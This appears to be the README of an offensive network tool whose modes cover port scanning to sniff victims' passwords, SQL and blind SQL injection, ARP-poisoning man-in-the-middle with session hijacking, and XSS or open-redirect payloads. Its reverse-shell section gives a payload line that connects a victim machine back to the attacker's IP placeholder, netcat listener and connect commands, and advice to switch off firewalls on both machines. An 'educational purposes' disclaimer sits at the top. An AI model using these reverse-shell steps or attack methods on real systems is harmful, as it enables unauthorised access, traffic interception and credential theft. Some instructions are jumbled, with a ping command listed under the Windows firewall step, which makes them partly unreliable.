# CustomNetworkTool
❗ Do not use it for malicious purposes, it's only for educational purposes.
 Stay in Legal !!!!!

![Ekran görüntüsü 2024-06-17 155733](https://github.com/YusufMarall/CustomNetworkTool/assets/114530242/eb208ca9-b528-49f3-8ac4-adccd54fd553)


## Remarks and Instructions for Use

This tool is designed to perform various network and security tests. Below you can find each mode and instructions for use.

### if(r==1)
####Scanning Port Similar to  Nmap
I wrote a module similar to Nmap, but faster than Nmap because I only scan specific ports. This works like this:

- If one of the specific ports I scan is open, I can use a network analyzer like Wireshark to monitor the traffic coming through that port. For example, when port 8080 (HTTP) is open, if our victim logs into an HTTP site through this port, I can see sensitive information such as his password.

### if(r==2)
#### Showing Website Content and SQL Injection Attempt
1. **Show Website Content**:
   - Shows the content of the website. If we know JavaScript, we can manipulate this content very easily.

2. **SQL Injection Attempt**:
   - Attempts SQL injection by sending our payloads with specific codes to the URL. If there is a database, this attack can be successful.

### if(r==3)
#### Man-in-the-Middle (MitM) Attack
1. **Man-in-the-Middle (MitM) Attack**:
   - ARP (Address Resolution Protocol): Maps a MAC address to an IP address.
   - ARP Poisoning: A cyber attack technique commonly used in local area networks. Using ARP poisoning, it can monitor and modify the communication between two devices without interrupting it. In this case, it can monitor and modify all traffic between the gateway (router) and the target device. For example, by monitoring the traffic between the gateway and the user, an attacker can intercept sensitive information (passwords, credit card information, etc.) sent by the user.

2. **Data Capture**:
   - With ARP poisoning, the attacker can redirect all network traffic of the target device to his own device and analyze this traffic. In this way, the attacker can capture and record all data passing through the target device.

3. **Session Hijacking**:
   - It can hijack sessions by capturing session cookies. This can be used to take over a user's session and gain unauthorized access to the user's accounts.

4. **Modifying Network Traffic**:
   - Can modify data packets between two devices. For example, it can modify web pages, redirect users to fake websites or inject malware into network traffic.

### if(r==4)
Blind sql injection does injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response and learns the database name
### if(r==5)
#### Reverse Shell and Netcat Usage
Reverse shell code creates payload and works like a backdoor. With Netcat, we can attack file uploading, eavesdropping, etc.

*Step 1: Make sure that the `payload.py` file on the victim machine is using the correct IP address and port. Check that your IP address is correct and the port you are listening on is 9998:
```python
s.connect(('YOUR_IP_ADDRESS', 9998)) # Replace YOUR_IP_ADDRESS with the IP address of your own machine
*Step 2: Set the Listening Machine Correctly
Make sure to start listening with netcat on the listening machine. Make sure you are listening using the correct port:
Linux:
nc -lvp 9998
*Step 3: Check Firewall and Firewalls
Firewalls or network firewalls on the listening machine and the victim machine may be blocking the connection. Try temporarily turning off the firewall on both machines:
Linux:
sudo ufw disable
Windows:ping YOUR_IP_ADDRESS
Step 4: Check Network Connectivity
Make sure that the network connection from the victim machine to the listening machine is working. Check the connection by pinging from the victim machine to the listening machine:
Windows:
ping YOUR_IP_ADDRESS
Linux:
ping YOUR_IP_ADDRESS
Step 5: Perform a Simple Connectivity Test with Netcat
Start listening with netcat on the listening machine:
Linux:
nc -lvp 9998
Try to establish a connection using netcat on the victim machine:
Linux:
nc YOUR_IP_ADDRESS 9998
 ### if r==6
###xss Cross-site scripting attack
###Open redirect vulnerability:
Explicit redirection vulnerabilities occur when an application insecurely incorporates user-controllable data into a redirection destination.
An attacker can generate a URL within the application that causes a redirection to an arbitrary external domain.
Hint===?redirect={payload}
